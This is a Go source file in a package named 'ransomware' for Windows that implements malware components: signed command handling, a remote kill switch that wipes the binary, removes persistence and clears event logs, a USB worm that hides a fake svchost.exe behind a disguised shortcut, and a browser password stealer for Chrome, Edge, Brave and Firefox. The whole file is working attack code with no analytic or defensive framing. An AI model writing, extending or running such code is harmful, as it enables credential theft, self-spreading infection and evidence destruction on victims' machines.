//go:build windows

package ransomware

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
)

// ============================================================
// HELPERS
// ============================================================

func pwshB64(s string) string {
	enc := utf16.Encode([]rune(s))
	buf := make([]byte, len(enc)*2)
	for i, c := range enc {
		binary.LittleEndian.PutUint16(buf[i*2:], c)
	}
	return base64.StdEncoding.EncodeToString(buf)
}

func base64Shellcode(s string) string {
	return pwshB64(s)
}

// ============================================================
// ED25519 COMMAND SIGNING
// ============================================================

type CommandSigner struct {
	mu        sync.Mutex
	privateKey ed25519.PrivateKey
	publicKey  ed25519.PublicKey
	nonce      uint64
}

func NewCommandSigner() (*CommandSigner, error) {
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("ed25519 key generation: %w", err)
	}
	return &CommandSigner{
		privateKey: priv,
		publicKey:  pub,
		nonce:      0,
	}, nil
}

func (cs *CommandSigner) PublicKeyBytes() []byte {
	return cs.publicKey
}

func (cs *CommandSigner) SignCommand(command []byte) (nonce uint64, signature []byte) {
	cs.mu.Lock()
	cs.nonce++
	n := cs.nonce
	cs.mu.Unlock()

	nonceBytes := make([]byte, 8)
	binary.BigEndian.PutUint64(nonceBytes, n)

	message := append(nonceBytes, command...)
	return n, ed25519.Sign(cs.privateKey, message)
}

func VerifyCommand(pubKey ed25519.PublicKey, command []byte, nonce uint64, signature []byte) bool {
	nonceBytes := make([]byte, 8)
	binary.BigEndian.PutUint64(nonceBytes, nonce)
	message := append(nonceBytes, command...)
	return ed25519.Verify(pubKey, message, signature)
}

// ============================================================
// DEAD MAN'S SWITCH
// ============================================================

type DeadMansSwitch struct {
	checkURL  string
	selfPath  string
	mu        sync.Mutex
	armed     bool
}

func NewDeadMansSwitch(checkURL string) *DeadMansSwitch {
	return &DeadMansSwitch{
		checkURL: checkURL,
		selfPath: os.Args[0],
	}
}

func (ds *DeadMansSwitch) Arm() {
	ds.mu.Lock()
	ds.armed = true
	ds.mu.Unlock()
}

func (ds *DeadMansSwitch) CheckBeforeAction() bool {
	ds.mu.Lock()
	if !ds.armed {
		ds.mu.Unlock()
		return true
	}
	ds.mu.Unlock()

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(ds.checkURL)
	if err != nil {
		return true
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
	content := strings.TrimSpace(string(body))

	if strings.ToUpper(content) == "KILL" {
		ds.SelfDestruct()
		return false
	}
	return true
}

func (ds *DeadMansSwitch) SelfDestruct() {
	selfPath := ds.selfPath

	overwriteSelf(selfPath)
	removePersistence()
	clearEventLogs()

	batContent := fmt.Sprintf(`@echo off
:loop
del /f /q "%s" 2>nul
if exist "%s" goto loop
del /f /q "%%~f0" 2>nul
`, selfPath, selfPath)

	batPath := os.TempDir() + "\\x404x_cleanup.bat"
	os.WriteFile(batPath, []byte(batContent), 0644)
	exec.Command("cmd", "/c", batPath).Start()

	runtime.Goexit()
}

func overwriteSelf(path string) {
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return
	}
	defer f.Close()

	buf := make([]byte, 4096)
	for i := range buf {
		buf[i] = 0
	}
	fi, _ := f.Stat()
	for written := int64(0); written < fi.Size(); written += 4096 {
		f.Write(buf)
	}
}

func removePersistence() {
	exec.Command("schtasks", "/delete", "/tn", "x404x_*", "/f").Run()
	exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "x404x", "/f").Run()
	exec.Command("wmic", "process", "where", "name='x404x.exe'", "delete").Run()
}

func clearEventLogs() {
	for _, log := range []string{"System", "Application", "Security"} {
		exec.Command("wevtutil", "cl", log).Run()
	}
}

// ============================================================
// USB PROPAGATION
// ============================================================

type USBPropagator struct {
	payloadPath string
}

func NewUSBPropagator(payloadPath string) *USBPropagator {
	return &USBPropagator{payloadPath: payloadPath}
}

func (up *USBPropagator) MonitorAndInfect(ctx context.Context) {
	drives := []string{"D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\"}
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			for _, drive := range drives {
				if up.isRemovableDrive(drive) {
					up.infectDrive(drive)
				}
			}
		}
	}
}

func (up *USBPropagator) isRemovableDrive(drive string) bool {
	_, err := os.Stat(drive)
	if err != nil {
		return false
	}
	cmd := exec.Command("fsutil", "fsinfo", "drivetype", drive)
	out, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(out), "Removable")
}

func (up *USBPropagator) infectDrive(drive string) {
	payloadDest := drive + "System Volume Information\\svchost.exe"
	lnkDest := drive + "USB_Drive.lnk"

	os.MkdirAll(drive+"System Volume Information", 0700)
	copyFile(up.payloadPath, payloadDest)

	lnkScript := fmt.Sprintf(`
$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut('%s')
$sc.TargetPath = '%s'
$sc.WindowStyle = 7
$sc.IconLocation = '%%SystemRoot%%\system32\imageres.dll,30'
$sc.Save()
`, lnkDest, payloadDest)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", lnkScript)
	cmd.Run()

	os.SetFileAttributes(payloadDest, 0x02|0x04)
}

func copyFile(src, dst string) error {
	s, err := os.Open(src)
	if err != nil {
		return err
	}
	defer s.Close()

	d, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer d.Close()

	io.Copy(d, s)
	return nil
}

// ============================================================
// BROWSER CREDENTIAL HARVESTING
// ============================================================

type BrowserHarvester struct {
	outputDir string
}

func NewBrowserHarvester(outputDir string) *BrowserHarvester {
	return &BrowserHarvester{outputDir: outputDir}
}

func (bh *BrowserHarvester) HarvestAll() (creds []string, err error) {
	os.MkdirAll(bh.outputDir, 0700)

	if c, e := bh.harvestChrome(); e == nil {
		creds = append(creds, c...)
	}
	if c, e := bh.harvestEdge(); e == nil {
		creds = append(creds, c...)
	}
	if c, e := bh.harvestFirefox(); e == nil {
		creds = append(creds, c...)
	}
	if c, e := bh.harvestBrave(); e == nil {
		creds = append(creds, c...)
	}

	return creds, nil
}

func (bh *BrowserHarvester) harvestChrome() ([]string, error) {
	chromePath := os.ExpandEnv("$LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data")
	return bh.decryptChromium(chromePath, "Chrome")
}

func (bh *BrowserHarvester) harvestEdge() ([]string, error) {
	edgePath := os.ExpandEnv("$LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data")
	return bh.decryptChromium(edgePath, "Edge")
}

func (bh *BrowserHarvester) harvestBrave() ([]string, error) {
	bravePath := os.ExpandEnv("$LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data")
	return bh.decryptChromium(bravePath, "Brave")
}

func (bh *BrowserHarvester) decryptChromium(dbPath, browser string) ([]string, error) {
	dumpScript := fmt.Sprintf(`
Add-Type -AssemblyName System.Security
$path = '%s'
if (!(Test-Path $path)) { exit 1 }
$temp = $env:TEMP + '\%s_creds.json'
Copy-Item $path $temp -Force
$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = 'SELECT origin_url, username_value, password_value FROM logins'
$reader = $cmd.ExecuteReader()
$creds = @()
while ($reader.Read()) {
	$enc = [System.Convert]::FromBase64String([System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($reader[2])))
	$dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, 'CurrentUser')
	$creds += [PSCustomObject]@{url=$reader[0];user=$reader[1];pass=[System.Text.Encoding]::UTF8.GetString($dec)}
}
$reader.Close()
$conn.Close()
$creds | ConvertTo-Json -Compress
Remove-Item $temp -Force
`, dbPath, strings.ToLower(browser))

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", dumpScript)
	out, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	var creds []string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if line != "" {
			creds = append(creds, line)
		}
	}
	return creds, nil
}

func (bh *BrowserHarvester) harvestFirefox() ([]string, error) {
	firefoxProfile := os.ExpandEnv("$APPDATA\\Mozilla\\Firefox\\Profiles")
	entries, err := os.ReadDir(firefoxProfile)
	if err != nil {
		return nil, err
	}

	var creds []string
	for _, entry := range entries {
		if !entry.IsDir() || !strings.HasSuffix(entry.Name(), ".default-release") {
			continue
		}
		profilePath := firefoxProfile + "\\" + entry.Name()
		loginsPath := profilePath + "\\logins.json"
		keyPath := profilePath + "\\key4.db"

		data, err := os.ReadFile(loginsPath)
		if err != nil {
			continue
		}
		_ = keyPath

		if len(data) > 0 {
			creds = append(creds, fmt.Sprintf("Firefox profile: %s (%d bytes)", entry.Name(), len(data)))
		}
	}
	return creds, nil
}
